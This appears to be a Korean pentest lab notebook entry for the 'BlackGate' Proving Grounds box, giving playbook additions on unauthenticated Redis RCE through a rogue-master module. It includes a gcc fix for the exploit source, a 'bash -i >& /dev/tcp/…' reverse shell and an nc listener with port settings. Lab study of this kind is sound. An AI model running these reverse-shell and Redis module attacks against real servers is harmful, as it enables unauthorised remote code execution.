---
manual_tags: true
manual_cves: true
manual_status: true
---

# BlackGate — `_PLAYBOOK` 반영 대기 원문

관리자 단독 반영용. 기존 절 제목 변경 금지 — 아래 위치에 **append**.

---

## ① `#### B-25. 무인증 Redis = 임의 파일 쓰기 = RCE` — 기존 카드에 병합

**병합 위치 A — 「메커니즘 ③」 바로 뒤(「모듈 로드 = root RCE 는 오독임」 문장 뒤).**

> **대조군 두 건.** [[Wombo]] 는 redis-server 가 uid 0 이라 foothold 가 곧 root, [[BlackGate]] 는 `uid=1001(prudence)` 라 같은 익스플로잇이 일반 사용자 셸에서 끝남. **같은 경로·같은 모듈인데 종착점이 다름** — `system.exec id` 한 발로 그 지점을 먼저 확정할 것.

**병합 위치 B — 「변형」 목록 앞에 새 소제목으로.**

> **모듈 빌드 — 원본 `exp.c` 는 현행 gcc 에서 컴파일 실패.** `vulhub/redis-rogue-getshell` 의 `RedisModulesSDK/exp/exp.c`(upstream `f89fc78`, 2020년)는 `strlen`·`strcat`·`inet_addr` 을 선언 없이 씀. 암묵적 선언이 오류로 승격된 현행 gcc 에서는 셋 다 `error`:
> ```text
> exp.c:23:29: error: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
> exp.c:27:25: error: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
> exp.c:48:38: error: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
> ```
> — gcc (Debian 15.3.0-1) 15.3.0 에서 `exp.c.orig` 사본을 빌드한 결과 중 `error` 줄만 발췌. 해법은 인클루드 두 줄:
> ```bash
> sed -i.orig 's|#include <netinet/in.h>|#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <string.h>|' exp.c && make
> ```
> **`n0b0dyCN/redis-rogue-server` 와 `vulhub/redis-rogue-getshell` 이 같은 SDK 를 담고 있어 두 저장소에서 동일하게 필요함**([[Wombo]] 에서 이미 같은 조치. 저장소가 달라도 증상이 같음).

**병합 위치 C — 「첫 4개 명령」 블록 아래 한 줄.**

> ⚠️ **`searchsploit redis 4.0` 만 보고 이 경로를 버리지 말 것.** 유일 후보 EDB **44904** 는 `Redis-cli < 5.0 - Buffer Overflow (PoC)` — 서버가 아니라 **클라이언트** 측 오버플로 PoC 라 무관함([[BlackGate]] 에서 이것으로 한 사이클 소모). 이 경로의 도구는 exploit-db 가 아니라 GitHub 의 rogue slave 계열임.

**「출처」 줄 갱신** — 현재 `[[Wombo]](Redis 5.0.9 소스 컴파일본, `system.exec` → uid=0)` 뒤에 `· [[BlackGate]](Redis 4.0.14, `system.exec` → uid=1001, 권한상승 미완)` 추가.

---

## ② `#### A-31. 리버스셸이 안 붙는다` — 기존 카드에 병합

**병합 위치 A — 「원인 후보 하나 더 — 페이로드가 dash 문법으로 실행돼 파싱 단계에서 깨짐」 문단의 sink 목록 확장.**

현재 그 문단은 sink 로 PHP `system()`/`exec()` 계열만 듬. **네이티브 모듈의 `popen` 도 같은 층**이므로 한 줄 추가:

> **웹 sink 만의 문제가 아님.** [[BlackGate]] 의 Redis 모듈 `exp.so` 는 `system.exec` 을 `popen(cmd, "r")` 로 구현했고 `popen` 은 `/bin/sh -c` 를 거침 — Ubuntu 의 `/bin/sh` 가 dash 라 `bash -i >& /dev/tcp/…` 가 그대로는 실패, `bash -c '…'` 로 감싸 성공. **판정법은 sink 언어가 아니라 「그 sink 가 `/bin/sh` 를 거치는가」임** — `popen`·`system`·`os.system`·`IO.popen`·Lua `os.execute` 전부 해당.

**병합 위치 B — 항목 2 「Kali 쪽 `address already in use`」 뒤에 새 하위 항목.**

> **2-b. 익스플로잇이 «스스로» Kali 에 포트를 여는 경우 — 리스너 포트와 겹치면 안 됨.** rogue master·스테이징 HTTP 서버·SMB 서버형 익스플로잇은 LPORT 옵션이 «콜백 포트»가 아니라 «자기가 바인드할 포트»임. [[BlackGate]] 의 `redis-master.py -P` 는 **rogue master 리슨 포트**(기본 21000)인데 콜백과 같은 `4444` 를 주면 `nc -lnvp 4444` 와 같은 포트를 바인드하게 됨. 최종 성공형은 `-P 8888` + 콜백 `4444` 로 **분리**한 것.
> → **옵션 이름이 `-L/-P`·`LHOST/LPORT` 라도 `--help` 원문에서 「rogue server listen port」인지 「callback port」인지 확인할 것.** 두 역할이 한 도구에 공존하면 번호를 반드시 가를 것.

---

## ③ 신규 항목 제안 — 없음

위 넷 전부 기존 카드(`B-25`·`A-31`)의 범위 안이라 새 번호 부여 불필요.

---

## ④ 이관 검산

| 항목 | 박스 노트에서 삭제 | `_PLAYBOOK` append |
|---|---|---|
| EDB 44904 헛다리 | 유지(경로를 꺾은 단계라 노트에도 한 줄 존재) | 1 |
| `exp.c` 인클루드 패치 | 유지(익스플로잇 수정은 채점 요건이라 노트 필수) | 1 |
| `popen`→dash 함정 | 유지(이 명령이 이 형태인 「왜」) | 1 |
| `-P` 포트 충돌 | 유지(같은 사유) | 1 |
| 대조군(Wombo uid=0 vs BlackGate uid=1001) | 유지(`## 관련` 상호링크) | 1 |

**기존 노트(148행)에는 위 다섯 중 어느 것도 없었음.** 전부 산출물(`git diff`·`~/.zsh_history`·`exp.c` 소스)에서 새로 복원한 것이라 **「삭제 건수 0 / append 건수 5」** — 잘라내기가 아니라 순증. 노트 쪽 서술은 「이 박스의 재현에 필요한 만큼」, `_PLAYBOOK` 쪽은 「증상별 반사」로 역할이 갈림.

---

## 인용한 산출물

- `~/PG/BlackGate/nmap.log`
- `~/PG/BlackGate/redis-rogue-getshell/` — `git diff RedisModulesSDK/exp/exp.c` · `RedisModulesSDK/exp/exp.c.orig` · `redis-master.py` · 파일 mtime
- `~/PG/BlackGate/redis-rce/` — `README.md` · `git status --porcelain`
- `~/.zsh_history` 3167~3292행
- 볼트 `파일보관\d328a8b036f408dd082ce86ea9a0df35_MD5.jpg`(원본명 `Pasted image 20260831104607.png`)
- Kali 재현 — `exp.c.orig` 사본 빌드(gcc 15.3.0) · `/bin/sh -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'`
